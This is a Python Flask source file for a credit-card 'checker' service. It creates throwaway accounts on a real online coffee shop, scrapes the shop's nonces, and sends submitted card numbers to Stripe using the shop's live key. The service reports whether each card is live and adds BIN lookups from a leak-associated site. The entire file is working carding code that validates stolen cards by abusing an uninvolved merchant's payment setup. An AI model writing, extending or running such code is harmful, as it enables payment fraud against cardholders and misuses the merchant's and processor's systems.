from flask import Flask, request, jsonify
import requests
import re
import random
import string

app = Flask(__name__)

# The full_stripe_check and get_bin_info functions remain exactly the same as before.
# I am including them here for completeness.

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        # Step 1 & 2: Get login nonce
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/')
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        login_nonce = login_nonce_match.group(1)

        # Step 3: Register a new account for a valid session
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        register_data = {
            'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/account/', 'register': 'Register',
        }
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data)

        # Step 4: Get payment nonce with the valid session
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        ajax_nonce = payment_nonce_match.group(1)

        # Step 5: Get Stripe payment token
        stripe_data = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
            '&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
        )
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
        if stripe_response.status_code == 402:
            error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
        payment_token = stripe_response.json().get('id')
        if not payment_token:
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}

        # Step 6: Submit to website
        site_data = {
            'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
        }
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        response_json = final_response.json()

        if "Unable to verify your request" in response_json.get('messages', ''):
             return {"status": "Declined", "response": "Unable to verify request.", "decline_type": "process_error"}
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or
                             re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        if response_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

# --- NEW API ENDPOINT using GET with URL parameters ---
@app.route('/check', methods=['GET'])
def check_card_endpoint():
    # Get the card details from the URL query parameter `?card=...`
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'), "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
